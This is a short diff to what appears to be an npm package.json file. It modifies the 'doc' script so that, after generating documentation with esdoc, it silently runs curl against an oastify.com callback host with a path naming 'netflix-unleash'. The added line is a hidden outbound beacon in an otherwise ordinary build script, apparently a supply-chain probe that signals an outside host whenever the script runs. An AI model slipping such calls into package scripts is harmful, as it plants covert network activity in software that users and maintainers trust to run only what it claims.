@@ -10,7 +10,7 @@
     "testunit": "./node_modules/.bin/tape tests/specs/*.js | tap-difflet"
   },
   "scripts": {
-    "doc": "esdoc -c ./esdoc.json",
+    "doc": "esdoc -c ./esdoc.json && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/netflix-unleash",
     "lint": "eslint $npm_package_config_lint && jscs $npm_package_config_lint",
     "report-deps": "npm-check",
     "prepublishOnly": "npm run test",
